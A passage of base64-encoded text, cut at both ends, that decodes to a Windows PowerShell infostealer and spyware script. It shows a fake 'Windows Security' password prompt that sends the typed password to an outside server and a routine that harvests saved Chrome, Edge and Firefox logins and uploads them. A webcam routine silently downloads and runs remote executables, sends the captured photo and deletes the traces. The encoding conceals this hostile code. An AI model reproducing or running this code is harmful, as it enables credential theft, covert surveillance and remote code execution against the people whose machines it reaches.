pLlRvU3RyaW5nKCJvIikKCiAgICAjIENyZWF0ZSBhIGN1c3RvbSBvYmplY3QgdG8gaG9sZCB0aGUgcmVzdWx0cwogICAgJGRldmljZUluZm8gPSBAewogICAgICAgIG1vZGVsICAgICAgPSAkbW9kZWwKICAgICAgICBwcml2aWxlZ2UgID0gJHByaXZpbGVnZQogICAgICAgIHByaXZhdGVfaXAgPSAkcHJpdmF0ZV9pcAogICAgICAgIHRpbWVzdGFtcCAgPSAkdGltZXN0YW1wCiAgICB9CgogICAgcmV0dXJuICRkZXZpY2VJbmZvCn0KCgoKIyBGdW5jdGlvbiB0byBnZW5lcmF0ZSBhIHNlc3Npb24gSUQKZnVuY3Rpb24gR2VuZXJhdGUtU2Vzc2lvbklEIHsKICAgICAkb3NfdmVyc2lvbiA9ICRlbnY6Q09NUFVURVJOQU1FCiAgICAgcmV0dXJuICRvc192ZXJzaW9uCn0KCmZ1bmN0aW9uIFNob3ctU2VjdXJpdHlGb3JtIHsKICAgICMgQ3JlYXRlIHRoZSBmb3JtCiAgICAkZm9ybSA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybQogICAgJGZvcm0uVGV4dCA9ICJXaW5kb3dzIFNlY3VyaXR5IgogICAgJGZvcm0uU2l6ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuU2l6ZSg0MDAsMjUwKQogICAgJGZvcm0uU3RhcnRQb3NpdGlvbiA9ICJDZW50ZXJTY3JlZW4iCiAgICAkZm9ybS5CYWNrQ29sb3IgPSBbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpCbGFjawogICAgJGZvcm0uRm9ybUJvcmRlclN0eWxlID0gW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkZvcm1Cb3JkZXJTdHlsZV06Ok5vbmUKICAgICRmb3JtLk1heGltaXplQm94ID0gJGZhbHNlCgogICAgIyBUaXRsZSBMYWJlbAogICAgJHRpdGxlTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsCiAgICAkdGl0bGVMYWJlbC5UZXh0ID0gIldpbmRvd3MgU2VjdXJpdHkiCiAgICAkdGl0bGVMYWJlbC5Gb3JlQ29sb3IgPSBbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpXaGl0ZQogICAgJHRpdGxlTGFiZWwuRm9udCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuRm9udCgiU2Vnb2UgVUkiLCAyMCwgW1N5c3RlbS5EcmF3aW5nLkZvbnRTdHlsZV06OkJvbGQpCiAgICAkdGl0bGVMYWJlbC5BdXRvU2l6ZSA9ICR0cnVlCiAgICAkdGl0bGVMYWJlbC5Mb2NhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoMjAsMjApCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHRpdGxlTGFiZWwpCgogICAgIyBQYXNzd29yZCBMYWJlbAogICAgJHBhc3N3b3JkTGFiZWwgPSBOZXctT2JqZWN0IFN5c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsCiAgICAkcGFzc3dvcmRMYWJlbC5UZXh0ID0gIkVudGVyIHlvdXIgcGFzc3dvcmQ6IgogICAgJHBhc3N3b3JkTGFiZWwuRm9yZUNvbG9yID0gW1N5c3RlbS5EcmF3aW5nLkNvbG9yXTo6V2hpdGUKICAgICRwYXNzd29yZExhYmVsLkZvbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkZvbnQoIlNlZ29lIFVJIiwgMTIpCiAgICAkcGFzc3dvcmRMYWJlbC5BdXRvU2l6ZSA9ICR0cnVlCiAgICAkcGFzc3dvcmRMYWJlbC5Mb2NhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoMjAsNzApCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHBhc3N3b3JkTGFiZWwpCgogICAgIyBQYXNzd29yZCBUZXh0Qm94CiAgICAkcGFzc3dvcmRUZXh0Ym94ID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5UZXh0Qm94CiAgICAkcGFzc3dvcmRUZXh0Ym94LkxvY2F0aW9uID0gTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5Qb2ludCgyMCwxMDApCiAgICAkcGFzc3dvcmRUZXh0Ym94LlNpemUgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlNpemUoMzUwLDMwKQogICAgJHBhc3N3b3JkVGV4dGJveC5Vc2VTeXN0ZW1QYXNzd29yZENoYXIgPSAkdHJ1ZQogICAgJGZvcm0uQ29udHJvbHMuQWRkKCRwYXNzd29yZFRleHRib3gpCgogICAgIyBTdWJtaXQgQnV0dG9uCiAgICAkc3VibWl0QnV0dG9uID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5CdXR0b24KICAgICRzdWJtaXRCdXR0b24uVGV4dCA9ICJPSyIKICAgICRzdWJtaXRCdXR0b24uTG9jYXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDE1MCwxODApCiAgICAkc3VibWl0QnV0dG9uLlNpemUgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlNpemUoMTAwLDMwKQogICAgJHN1Ym1pdEJ1dHRvbi5CYWNrQ29sb3IgPSBbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpGcm9tQXJnYigwLCAxMjAsIDIxNSkKICAgICRzdWJtaXRCdXR0b24uRm9yZUNvbG9yID0gW1N5c3RlbS5EcmF3aW5nLkNvbG9yXTo6V2hpdGUKICAgICRmb3JtLkNvbnRyb2xzLkFkZCgkc3VibWl0QnV0dG9uKQoKICAgICMg8J+UuSBIYW5kbGUgY2xpY2sgdG8gc2VuZCBwYXNzd29yZCB0byBOb2RlLmpzIEFQSQogICAgJHN1Ym1pdEJ1dHRvbi5BZGRfQ2xpY2soewogICAgICAgIGlmIChbc3RyaW5nXTo6SXNOdWxsT3JXaGl0ZVNwYWNlKCRwYXNzd29yZFRleHRib3guVGV4dCkpIHsKICAgICAgICAgICAgJGVycm9yTGFiZWwuVGV4dCA9ICJZb3UgbXVzdCBlbnRlciBhIHBhc3N3b3JkLiIKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcGFzc3dvcmQgPSAkcGFzc3dvcmRUZXh0Ym94LlRleHQKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiUGhpc2hpbmcgQ3JlZGVudGlhbHM6IGBuUGFzc3dvcmQ6ICRwYXNzd29yZCIKICAgICAgICAgICAgCiAgICAgICAgICAgICMgU2VuZCB0aGUgcGFzc3dvcmQgdG8gdGhlIHJlc3VsdCBBUEkgKE5vZGUuanMgc2VydmVyKQogICAgICAgICAgICAkcmVzdWx0QVBJID0gImh0dHBzOi8vbWUtc3o1eS5vbnJlbmRlci5jb20vcmVjZWl2ZS1yZXN1bHRzIiAgIyBZb3VyIE5vZGUuanMgQVBJIGVuZHBvaW50CgogICAgICAgICAgICAkYm9keSA9IEB7CiAgICAgICAgICAgICAgICByZXN1bHQgPSAkcGFzc3dvcmQKICAgICAgICAgICAgfSB8IENvbnZlcnRUby1Kc29uCgogICAgICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICRyZXN1bHRBUEkgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKCiAgICAgICAgICAgICMgQ2xvc2UgdGhlIGZvcm0gYWZ0ZXIgc2VuZGluZyB0aGUgcGFzc3dvcmQKICAgICAgICAgICAgJGZvcm0uQ2xvc2UoKQogICAgICAgIH0KICAgIH0pCgogICAgIyBTaG93IHRoZSBmb3JtCiAgICAkZm9ybS5BZGRfU2hvd24oeyAkZm9ybS5BY3RpdmF0ZSgpIH0pCiAgICAkZm9ybS5TaG93RGlhbG9nKCkgfCBPdXQtTnVsbAp9CgpmdW5jdGlvbiBTZW5kLVRlbGVncmFtRmlsZSB7CiAgICBwYXJhbShbc3RyaW5nXSRmaWxlUGF0aCkKCiAgICAjIENoZWNrIGlmIHRoZSBwcm92aWRlZCBmaWxlIHBhdGggaXMgbm90IGFic29sdXRlIChpLmUuLCBhIHJlbGF0aXZlIHBhdGgpCiAgICBpZiAoLW5vdCAoW1N5c3RlbS5JTy5QYXRoXTo6SXNQYXRoUm9vdGVkKCRmaWxlUGF0aCkpKSB7CiAgICAgICAgJGZpbGVQYXRoID0gSm9pbi1QYXRoIC1QYXRoIChHZXQtTG9jYXRpb24pLlBhdGggLUNoaWxkUGF0aCAkZmlsZVBhdGgKICAgIH0KCiAgICAjIENoZWNrIGlmIHRoZSBmaWxlIGV4aXN0cwogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZmlsZVBhdGgpKSB7CiAgICAgICAgV3JpdGUtSG9zdCAiRmlsZSBub3QgZm91bmQ6ICRmaWxlUGF0aCIKICAgICAgICByZXR1cm4gIkZpbGUgbm90IGZvdW5kOiAkZmlsZVBhdGgiCiAgICB9CgogICAgJHVyaSA9ICJodHRwczovL21lLXN6NXkub25yZW5kZXIuY29tL2ZpbGVzIgogICAgJGZpbGVOYW1lID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0RmlsZU5hbWUoJGZpbGVQYXRoKQogICAgJGJvdW5kYXJ5ID0gW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkKCiAgICAjIFJlYWQgdGhlIGZpbGUgY29udGVudAogICAgJGZpbGVDb250ZW50ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlUGF0aCkKCiAgICAjIERlZmluZSB0aGUgbXVsdGlwYXJ0IGJvZHkgYm91bmRhcnkgYW5kIGhlYWRlcnMKICAgICRMRiA9ICJgcmBuIgogICAgJGZpZWxkcyA9ICgKICAgICAgICAiLS0kYm91bmRhcnkkTEYiICsKICAgICAgICAiQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPWAiZG9jdW1lbnRgIjsgZmlsZW5hbWU9YCIkZmlsZU5hbWVgIiRMRiIgKwogICAgICAgICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSRMRiRMRiIKICAgICkKCiAgICAkZW5kQm91bmRhcnkgPSAiJExGLS0kYm91bmRhcnktLSRMRiIKICAgIAogICAgIyBDb21iaW5lIGhlYWRlcnMsIGZpbGUgY29udGVudCwgYW5kIGJvdW5kYXJ5IGZvciB0aGUgYm9keQogICAgJGJvZHlCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRmaWVsZHMpICsgJGZpbGVDb250ZW50ICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJGVuZEJvdW5kYXJ5KQoKICAgICMgU2V0IHVwIHRoZSBIVFRQIHJlcXVlc3QKICAgICRyZXF1ZXN0ID0gW1N5c3RlbS5OZXQuSHR0cFdlYlJlcXVlc3RdOjpDcmVhdGUoJHVyaSkKICAgICRyZXF1ZXN0Lk1ldGhvZCA9ICJQT1NUIgogICAgJHJlcXVlc3QuQ29udGVudFR5cGUgPSAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JGJvdW5kYXJ5IgogICAgJHJlcXVlc3QuQ29udGVudExlbmd0aCA9ICRib2R5Qnl0ZXMuTGVuZ3RoCgogICAgIyBXcml0ZSB0aGUgYm9keSBjb250ZW50IHRvIHRoZSByZXF1ZXN0IHN0cmVhbQogICAgJHJlcXVlc3RTdHJlYW0gPSAkcmVxdWVzdC5HZXRSZXF1ZXN0U3RyZWFtKCkKICAgICRyZXF1ZXN0U3RyZWFtLldyaXRlKCRib2R5Qnl0ZXMsIDAsICRib2R5Qnl0ZXMuTGVuZ3RoKQogICAgJHJlcXVlc3RTdHJlYW0uQ2xvc2UoKQoKICAgICMgR2V0IHRoZSByZXNwb25zZSBmcm9tIHRoZSBzZXJ2ZXIKICAgIHRyeSB7CiAgICAgICAgJHJlc3BvbnNlID0gJHJlcXVlc3QuR2V0UmVzcG9uc2UoKQogICAgICAgICRyZXNwb25zZVN0cmVhbSA9ICRyZXNwb25zZS5HZXRSZXNwb25zZVN0cmVhbSgpCiAgICAgICAgJHJlYWRlciA9IFtTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyXTo6bmV3KCRyZXNwb25zZVN0cmVhbSkKICAgICAgICAkcmVzcG9uc2VDb250ZW50ID0gJHJlYWRlci5SZWFkVG9FbmQoKQogICAgICAgICRyZWFkZXIuQ2xvc2UoKQoKICAgICAgICAjIENoZWNrIHRoZSByZXNwb25zZSBzdGF0dXMKICAgICAgICBpZiAoJHJlc3BvbnNlLlN0YXR1c0NvZGUgLWVxIDIwMCkgewogICAgICAgICAgICBXcml0ZS1Ib3N0ICJGaWxlIHVwbG9hZGVkIHN1Y2Nlc3NmdWxseS4iCiAgICAgICAgICAgIHJldHVybiAiRmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVsbHkuIgogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIkZhaWxlZCB0byB1cGxvYWQgZmlsZS4gU3RhdHVzIGNvZGU6ICQoJHJlc3BvbnNlLlN0YXR1c0NvZGUpIgogICAgICAgICAgICByZXR1cm4gIkZhaWxlZCB0byB1cGxvYWQgZmlsZS4gU3RhdHVzIGNvZGU6ICQoJHJlc3BvbnNlLlN0YXR1c0NvZGUpIgogICAgICAgIH0KICAgIH0gY2F0Y2ggewogICAgICAgIFdyaXRlLUhvc3QgIkVycm9yIHVwbG9hZGluZyBmaWxlOiAkXyIKICAgICAgICByZXR1cm4gIkVycm9yIHVwbG9hZGluZyBmaWxlOiAkXyIKICAgIH0KfQoKCgpmdW5jdGlvbiBGZXRjaC1Ccm93c2VyRGF0YSB7CiAgICAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCgogICAgIyBDaGVjayBpZiBzcWxpdGUzIGlzIGluc3RhbGxlZAogICAgdHJ5IHsKICAgICAgICAkc3FsaXRlM1ZlcnNpb24gPSAmIHNxbGl0ZTMgLS12ZXJzaW9uCiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgIyBTZXQgVVJMIGZvciA2NC1iaXQgU1FMaXRlIDIwMjUgdmVyc2lvbgogICAgICAgICR1cmwgPSAiaHR0cHM6Ly93d3cuc3FsaXRlLm9yZy8yMDI1L3NxbGl0ZS10b29scy13aW4teDY0LTM0OTAxMDAuemlwIgoKICAgICAgICAjIERlZmluZSB0ZW1wIHBhdGhzCiAgICAgICAgJHRlbXBaaXAgPSAiJGVudjpURU1QXHNxbGl0ZS10b29scy56aXAiCiAgICAgICAgJHRlbXBEaXIgPSAiJGVudjpURU1QXHNxbGl0ZS10ZW1wIgoKICAgICAgICAjIERvd25sb2FkIGFuZCBleHRyYWN0CiAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJsIC1PdXRGaWxlICR0ZW1wWmlwCiAgICAgICAgRXhwYW5kLUFyY2hpdmUgLVBhdGggJHRlbXBaaXAgLURlc3RpbmF0aW9uUGF0aCAkdGVtcERpciAtRm9yY2UKCiAgICAgICAgIyBDb3B5IHRoZSBTUUxpdGUgZXhlY3V0YWJsZXMgdG8gU3lzdGVtMzIgKGZvciBnbG9iYWwgYWNjZXNzKQogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggIiR0ZW1wRGlyXCouZXhlIiB8IENvcHktSXRlbSAtRGVzdGluYXRpb24gIiRlbnY6d2luZGlyXFN5c3RlbTMyIiAtRm9yY2UKCiAgICAgICAgIyBDbGVhbiB1cAogICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICR0ZW1wWmlwLCAkdGVtcERpciAtUmVjdXJzZSAtRm9yY2UKICAgIH0KCiAgICAjIERlZmluZSB0aGUgb3V0cHV0IGZpbGUgcGF0aCBpbiB0aGUgVEVNUCBkaXJlY3RvcnkKICAgICRvdXRwdXRGaWxlID0gIiRlbnY6VEVNUFxicm93c2VyX2RhdGEudHh0IgoKICAgICMgSW5pdGlhbGl6ZSB0aGUgb3V0cHV0IGZpbGUgd2l0aCBhIHRpdGxlCiAgICAiQnJvd3NlciBEYXRhIEV4dHJhY3Rpb24gUmVwb3J0IiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkb3V0cHV0RmlsZSAtRm9yY2UKICAgICJHZW5lcmF0ZWQgb246ICQoR2V0LURhdGUpIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkb3V0cHV0RmlsZSAtQXBwZW5kCiAgICAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkb3V0cHV0RmlsZSAtQXBwZW5kCgogICAgIyBGdW5jdGlvbiB0byBwcm9jZXNzIGEgYnJvd3NlcidzIExvZ2luIERhdGEKICAgIGZ1bmN0aW9uIFByb2Nlc3MtTG9naW5EYXRhKCRicm93c2VyTmFtZSwgJGxvZ2luRGF0YVBhdGgpIHsKICAgICAgICBpZiAoLU5vdCAoVGVzdC1QYXRoICRsb2dpbkRhdGFQYXRoKSkgewogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CgogICAgICAgICMgQ3JlYXRlIGEgdGVtcG9yYXJ5IGNvcHkgb2YgdGhlIGRhdGFiYXNlIHRvIGF2b2lkIGxvY2tpbmcgaXNzdWVzCiAgICAgICAgJHRlbXBEYiA9ICIkZW52OlRFTVBcJGJyb3dzZXJOYW1lYExvZ2luRGF0YUNvcHkuZGIiCiAgICAgICAgQ29weS1JdGVtIC1QYXRoICRsb2dpbkRhdGFQYXRoIC1EZXN0aW5hdGlvbiAkdGVtcERiIC1Gb3JjZQoKICAgICAgICAjIERlZmluZSB0aGUgcXVlcnkgZm9yIGxvZ2luIGRhdGEKICAgICAgICAkcXVlcnkgPSAiU0VMRUNUIG9yaWdpbl91cmwsIHVzZXJuYW1lX3ZhbHVlIEZST00gbG9naW5zOyIKCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHJlc3VsdHMgPSAmIHNxbGl0ZTMgJHRlbXBEYiAkcXVlcnkKCiAgICAgICAgICAgIGlmICgkcmVzdWx0cykgewogICAgICAgICAgICAgICAgJHJlc3VsdHMgLXNwbGl0ICJgbiIgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJGxpbmUgPSAkXy5UcmltKCkKICAgICAgICAgICAgICAgICAgICBpZiAoJGxpbmUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnRzID0gJGxpbmUgLXNwbGl0ICdcfCcKICAgICAgICAgICAgICAgICAgICAgICAgJG9yaWdpbiA9ICRwYXJ0c1swXQogICAgICAgICAgICAgICAgICAgICAgICAkdXNlcm5hbWUgPSAkcGFydHNbMV0KCiAgICAgICAgICAgICAgICAgICAgICAgICMgQ2hlY2sgaWYgdGhlIHVzZXJuYW1lIGlzIGVtcHR5IGFuZCBoYW5kbGUgYWNjb3JkaW5nbHkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFtzdHJpbmddOjpJc051bGxPcldoaXRlU3BhY2UoJHVzZXJuYW1lKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHVzZXJuYW1lID0gIk5vIFVzZXJuYW1lIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAjIEZvcm1hdCB0aGUgb3V0cHV0CiAgICAgICAgICAgICAgICAgICAgICAgICRvdXRwdXRMaW5lID0gIlVzZXJuYW1lOiAkdXNlcm5hbWUsIE9yaWdpbiBVUkw6ICRvcmlnaW4iCiAgICAgICAgICAgICAgICAgICAgICAgICRvdXRwdXRMaW5lIHwgT3V0LUZpbGUgLUZpbGVQYXRoICRvdXRwdXRGaWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIgfCBPdXQtRmlsZSAtRmlsZVBhdGggJG91dHB1dEZpbGUgLUFwcGVuZAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICJObyBsb2dpbiBkYXRhIGZvdW5kIGZvciAkYnJvd3Nlck5hbWUuIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkb3V0cHV0RmlsZSAtQXBwZW5kCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAjIEhhbmRsZSBhbnkgZXJyb3JzIGJ1dCBkbyBub3QgcHJpbnQgbWVzc2FnZXMgdG8gc2NyZWVuCiAgICAgICAgfQoKICAgICAgICAjIENsZWFuIHVwCiAgICAgICAgUmVtb3ZlLUl0ZW0gJHRlbXBEYiAtRm9yY2UKICAgIH0KCiAgICAjIENocm9tZSBMb2dpbiBEYXRhIFBhdGgKICAgICRjaHJvbWVMb2dpbkRhdGFQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YSIKICAgIFByb2Nlc3MtTG9naW5EYXRhICJDaHJvbWUiICRjaHJvbWVMb2dpbkRhdGFQYXRoCgogICAgIyBFZGdlIExvZ2luIERhdGEgUGF0aAogICAgJGVkZ2VMb2dpbkRhdGFQYXRoID0gIiRlbnY6TE9DQUxBUFBEQVRBXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGEiCiAgICBQcm9jZXNzLUxvZ2luRGF0YSAiRWRnZSIgJGVkZ2VMb2dpbkRhdGFQYXRoCgogICAgIyBGaXJlZm94IFByb2ZpbGVzIFBhdGggQ2hlY2sKICAgICRmaXJlZm94UHJvZmlsZXNQYXRoID0gIiRlbnY6QVBQREFUQVxNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXMiCiAgICBpZiAoVGVzdC1QYXRoICRmaXJlZm94UHJvZmlsZXNQYXRoKSB7CiAgICAgICAgJGZpcmVmb3hQcm9maWxlcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJGZpcmVmb3hQcm9maWxlc1BhdGggLURpcmVjdG9yeQogICAgICAgIGZvcmVhY2ggKCRwcm9maWxlIGluICRmaXJlZm94UHJvZmlsZXMpIHsKICAgICAgICAgICAgJGZpcmVmb3hMb2dpbkRhdGFQYXRoID0gIiRwcm9maWxlLkZ1bGxOYW1lXGxvZ2lucy5qc29uIgoKICAgICAgICAgICAgIyBQcm9jZXNzIEZpcmVmb3ggbG9naW4gZGF0YQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoICRmaXJlZm94TG9naW5EYXRhUGF0aCkgewogICAgICAgICAgICAgICAgUHJvY2Vzcy1Mb2dpbkRhdGEgIkZpcmVmb3giICRmaXJlZm94TG9naW5EYXRhUGF0aAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgICMgU2VuZCB0aGUgZmlsZSB1c2luZyBTZW5kLVRlbGVncmFtRmlsZSBmdW5jdGlvbgogICAgU2VuZC1UZWxlZ3JhbUZpbGUgLWZpbGVQYXRoICRvdXRwdXRGaWxlCgogICAgcmV0dXJuICJTdWNjZXNzZnVsbHkgZmV0Y2hlZCBkYXRhLiIKfQoKCmZ1bmN0aW9uIFdlYmNhbUNhcHR1cmUgewogICAgIyBEZWZpbmUgdGVtcCBhbmQgaGlkZGVuIHBhdGhzCiAgICAkdGVtcERpciA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBQYXRoKCkKICAgICRoaWRkZW5EaXIgPSBKb2luLVBhdGggJHRlbXBEaXIgImhpZGRlbiIKCiAgICAjIEVuc3VyZSBoaWRkZW4gZGlyZWN0b3J5IGV4aXN0cwogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkaGlkZGVuRGlyKSkgewogICAgICAgIE5ldy1JdGVtIC1QYXRoICRoaWRkZW5EaXIgLUl0ZW1UeXBlIERpcmVjdG9yeSB8IE91dC1OdWxsCiAgICAgICAgIyBTZXQgaGlkZGVuIGF0dHJpYnV0ZQogICAgICAgIChHZXQtSXRlbSAkaGlkZGVuRGlyKS5BdHRyaWJ1dGVzICs9ICdIaWRkZW4nCiAgICB9CgogICAgIyBEZWZpbmUgZmlsZSBVUkxzCiAgICAkZXhlVXJsICAgICA9ICJodHRwczovL2dpdGh1Yi5jb20vd2FnbmVyMDEyL3dhZ25lci9yYXcvcmVmcy9oZWFkcy9tYWluL3Rlc3QuZXhlIgogICAgJGRsbDFVcmwgICAgPSAiaHR0cHM6Ly9naXRodWIuY29tL3dhZ25lcjAxMi93YWduZXIvcmF3L3JlZnMvaGVhZHMvbWFpbi9BRm9yZ2UuVmlkZW8uZGxsIgogICAgJGRsbDJVcmwgICAgPSAiaHR0cHM6Ly9naXRodWIuY29tL3dhZ25lcjAxMi93YWduZXIvcmF3L3JlZnMvaGVhZHMvbWFpbi9BRm9yZ2UuVmlkZW8uRGlyZWN0U2hvdy5kbGwiCiAgICAkZGVjb2RlVXJsICA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vd2FnbmVyMDEyL3dhZ25lci9yZWZzL2hlYWRzL21haW4vZGVjb2RlLnBzMSIKCiAgICAjIERlZmluZSBmaWxlIHBhdGhzCiAgICAkZXhlUGF0aCAgICA9IEpvaW4tUGF0aCAkdGVtcERpciAidGVzdC5leGUiCiAgICAkZGxsMVBhdGggICA9IEpvaW4tUGF0aCAkdGVtcERpciAiQUZvcmdlLlZpZGVvLmRsbCIKICAgICRkbGwyUGF0aCAgID0gSm9pbi1QYXRoICR0ZW1wRGlyICJBRm9yZ2UuVmlkZW8uRGlyZWN0U2hvdy5kbGwiCiAgICAkZGVjb2RlUGF0aCA9IEpvaW4tUGF0aCAkdGVtcERpciAiZGVjb2RlLnBzMSIKCiAgICAjIERvd25sb2FkIG9ubHkgaWYgZmlsZXMgYXJlIG1pc3NpbmcKICAgIGlmICgtbm90IChUZXN0LVBhdGggJGV4ZVBhdGgpKSAgICAgeyBJbnZva2UtV2ViUmVxdWVzdCAkZXhlVXJsICAgICAtT3V0RmlsZSAkZXhlUGF0aCB9CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRkbGwxUGF0aCkpICAgIHsgSW52b2tlLVdlYlJlcXVlc3QgJGRsbDFVcmwgICAgLU91dEZpbGUgJGRsbDFQYXRoIH0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGRsbDJQYXRoKSkgICAgeyBJbnZva2UtV2ViUmVxdWVzdCAkZGxsMlVybCAgICAtT3V0RmlsZSAkZGxsMlBhdGggfQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZGVjb2RlUGF0aCkpICB7IEludm9rZS1XZWJSZXF1ZXN0ICRkZWNvZGVVcmwgIC1PdXRGaWxlICRkZWNvZGVQYXRoIH0KCiAgICAjIFJ1biB0aGUgd2ViY2FtIGNhcHR1cmUgZXhlY3V0YWJsZSBzaWxlbnRseQogICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGV4ZVBhdGggLVdvcmtpbmdEaXJlY3RvcnkgJHRlbXBEaXIgLVdpbmRvd1N0eWxlIEhpZGRlbiAtV2FpdAoKICAgICMgRGVjcnlwdCB0aGUgY2FwdHVyZWQgaW1hZ2UgdXNpbmcgZGVjb2RlLnBzMQogICAgcG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAkZGVjb2RlUGF0aAoKICAgICMgUGF0aCBvZiB0aGUgZmluYWwgZGVjcnlwdGVkIGltYWdlCiAgICAkZGVjcnlwdGVkSW1hZ2VQYXRoID0gSm9pbi1QYXRoICRoaWRkZW5EaXIgInBob3RvLmpwZyIKICAgICRwaG90b0RhdFBhdGggPSBKb2luLVBhdGggJGhpZGRlbkRpciAicGhvdG8uZGF0IgoKICAgIGlmIChUZXN0LVBhdGggJGRlY3J5cHRlZEltYWdlUGF0aCkgewogICAgICAgICMgU2VuZCB2aWEgVGVsZWdyYW0gaWYgbmVlZGVkCiAgICAgICAgU2VuZC1UZWxlZ3JhbUZpbGUgLWZpbGVQYXRoICRkZWNyeXB0ZWRJbWFnZVBhdGgKICAgICAgICAKICAgICAgICAjIENsZWFuIHVwOiBSZW1vdmUgdGhlIHBob3RvIGZpbGVzCiAgICAgICAgUmVtb3ZlLUl0ZW0gLVBhdGggJGRlY3J5cHRlZEltYWdlUGF0aCAtRm9yY2UKICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkcGhvdG9EYXRQYXRoIC1Gb3JjZQoKICAgICAgICByZXR1cm4gIlN1Y2Nlc3NmdWxseSB0b29rIHRoZSB3ZWJjYW0gcGhvdG8uIgogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gIkZhaWxlZCB0byBmaW5kIHRoZSBkZWNyeXB0ZWQgaW1hZ2UuIgogICAgfQp9CgpmdW5jdGlvbiBDYXB0dXJlLUFuZC1TZW5kLVNjcmVlbnNob3QgewogICAgJHNjcmVlbkJvdW5kcyA9IFtTeXN0